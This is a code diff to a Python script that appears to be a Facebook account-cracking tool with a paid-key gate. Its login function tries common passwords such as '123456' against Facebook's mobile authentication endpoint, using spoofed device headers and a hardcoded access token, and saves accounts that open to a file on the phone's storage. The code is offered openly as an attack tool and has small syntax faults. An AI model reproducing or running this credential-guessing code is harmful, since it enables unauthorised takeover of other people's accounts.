@@ -426,5 +426,108 @@ def main():
     info()
     sort.clear()
     sort.logo()
-    print("[b]    [red1][A] [chartreuse1]File Clone [blue][[green]B[red1]D[blue]-[orange1]I[white]N[bright_green]D[blue]]")
-    
+    print("[b]    [red1][A] [chartreuse1]File Clone [blue][[green]B[red1]D[blue]-[orange1]I[white]N[bright_green]D[blue]]"    
+    print("[b]    [red1][B] [spring_green2]Old Uid Clone")
+    print("[b]    [red1][C] [spring_green1]Random (more..2)")    
+    print(sort.line())
+    fast_choice=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
+    if fast_choice in ["1","01","a","A"]:
+        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]File Clone")
+        print(sort.line())
+        time.sleep(2)
+        filee()
+    elif fast_choice in ["2","02","b","B"]:
+        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Old Uid Crack")
+        print(sort.line())
+        time.sleep(2)
+        old()
+    elif fast_choice in ["3","03","c","C"]:
+        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Random Crack")
+        print(sort.line())
+        time.sleep(2)
+        ran()
+    else:
+        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
+        print(sort.line())
+        time.sleep(2)
+        main()
+        
+def paiduser():
+    uuid = str(os.geteuid())
+    os.system("clear")
+    print(sort.logo())
+    name = input("      Your Name : ")
+    Masum_Ahmed=(name + '//1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
+ #   print(sort.logo())
+    DARK=requests.get("https://github.com/bothacker33/Ab/blob/main/Approved%20").text
+    if Masum_Ahmed in DARK:
+        os.system('clear')
+        print(sort.logo())
+         
+    else:
+        os.system("clear")
+        print(sort.logo())
+      #  print("Approvel")
+        #time.sleep(1)
+       # os.system("clear")
+    #    print(sort.logo())
+        print ("")
+        print("[red1]You Need Get Approved First")
+        print("  [deep_pink2]Note : That is Paid because 80% ok id just now login")
+        print ("")
+        print(" 🔆Your Key is Not Approved 🔶")
+        print("")
+        print(" Copy And Send Key To Admin")
+        print ("")
+        print(f" Your Key : "+Masum_Ahmed)
+        print ("")
+        print ("")
+        
+       
+     
+        
+        sys.exit()
+paiduser()      
+
+def login(uid,meth):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}MxT-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
+        sys.stdout.flush()
+        for pw in ["123456","1234567","12345678","123456789"]:
+            if meth in ["1","01","A","a"]:
+                agent=ua()
+            else:
+                agent=Samsung()
+            headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
+            "x-fb-net-hni": str(random.randint(20000, 40000)), 
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "user-agent": agent, 
+            "content-type": "application/x-www-form-urlencoded", 
+            "x-fb-http-engine": "Liger"}
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                oks.append(uid)
+                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
+                open("/sdcard/MxT_old.txt","a").write(uid+"|"+pw+"\n")
+                break 
+            elif "Please Confirm Email" in str(rp):
+                oks.append(uid)
+                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
+                open("/sdcard/MxT_old.txt","a").write(uid+"|"+pw+"\n")
+                break
+            
+            else:continue
+        loop+=1
+    except:
+        time.sleep(30)
+        
+      
+
+
+
+main()
